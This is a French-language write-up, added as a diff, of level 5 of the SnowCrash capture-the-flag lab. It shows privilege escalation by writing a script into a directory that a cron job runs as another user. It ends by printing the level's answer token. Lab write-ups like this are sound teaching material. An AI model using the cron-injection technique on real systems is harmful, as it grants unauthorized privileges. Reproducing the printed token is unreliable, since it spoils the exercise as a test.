@@ -1,0 +1,35 @@
+Level05 :
+
+on se connecte avec le flag04
+
+il n'y a rien de flagrant ni a la racine ni dans le home
+
+on voit si un fichier level05 existe : find / -name level05
+
+on peut voir que l'on a accès à deux fichiers :
+—> /var/mail/level05
+—> /rofs/var/mail/level05
+
+quand on inspecte leurs contenu on obtient une crontab qui s'execute toute les 2 minutes et le chemin vers le fichier executé
+—> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+En inspectant les droits du fichier on peut voir un "+" ce qui veut dir qu'il dispose d'une liste d'ACLs
+
+—>	level05@SnowCrash:/$ ll /usr/sbin/openarenaserver
+	-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver*
+
+La commande getfacl /usr/sbin/openarenaserver nous permet de savoir que le fichier appartient à flag05
+
+	level05@SnowCrash:/$ getfacl /usr/sbin/openarenaserver
+	getfacl: Removing leading '/' from absolute path names
+	# file: usr/sbin/openarenaserver
+	# owner: flag05
+	# group: flag05
+
+on écrit un script qui éxecute getflag et place le flag dans le fichier /tmp/flag
+—> echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag
+
+la crontab s'execute toutes les 2 minutes donc un peu de patience 
+
+on regarde le fichier : cat /tmp/flag
+—> Check flag.Here is your token : viuaaale9huek52boumoomioc
